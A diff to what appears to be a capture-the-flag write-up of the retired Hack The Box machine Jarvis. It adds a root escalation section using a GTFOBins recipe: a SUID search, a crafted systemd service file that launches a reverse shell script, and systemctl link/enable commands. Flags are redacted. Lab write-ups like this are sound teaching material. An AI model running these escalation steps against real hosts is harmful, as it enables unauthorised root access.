@@ -1,7 +1,11 @@
 # HTB Jarvis - OSCP-Style Penetration Test Report
+
 **Author:** RandallTr
+
 **Target:** 10.129.229.137
+
 **Environment:** HTB (Retired Machine)
+
 **Date:** 2025-11-13
 
 ---
@@ -210,3 +214,56 @@ Shell obtained as user pepper. Flag `user.txt` found in `/home/pepper` directory
 **User flag:** *REDACTED*
 
 ---
+
+## 8. Privilege Escalation to Root
+
+### 8.1 SUID systemctl Abuse
+
+Identified unusual SUID binary:
+```
+find / -perm -4000 -ls 2>/dev/null
+```
+`/bin/systemctl` has SUID bit set.
+
+### 8.2 Create Malicious Service File via GTFOBins
+```
+TF=$(mktemp).service
+
+echo '[Service]
+Type=oneshot
+ExecStart=/home/pepper/shell.sh
+[Install]
+WantedBy=multi-user.target' > $TF
+```
+Copy reverse shell and service file from `/tmp` to `/home/pepper/` directory to prevent exectution failure.
+
+### 8.3 Enable Service with SUID systemctl
+```
+systemctl link $TF
+systemctl enable --now $TF
+```
+Reverse shell triggered from `/home/pepper/shell.sh`
+
+**Root shell obtained.**
+
+**Root flag:** *REDACTED*
+
+---
+
+## 9. Proofs
+
+**User:** *REDACTED*
+
+**Root:** *REDACTED*
+
+---
+
+## 10. Conclusion
+
+The Jarvis Machine was fully compromised due to:
+- A SQL injection vulnerability
+- Weak database security practices
+- Outdated and vulnerable phpMyAdmin installation
+- Dangerous privilege escalation misconfigurations
+
+A real-world system configured like this would be as severe risk of total compromise. Implementing the recommendations outlined earlier would significantly harden the host.
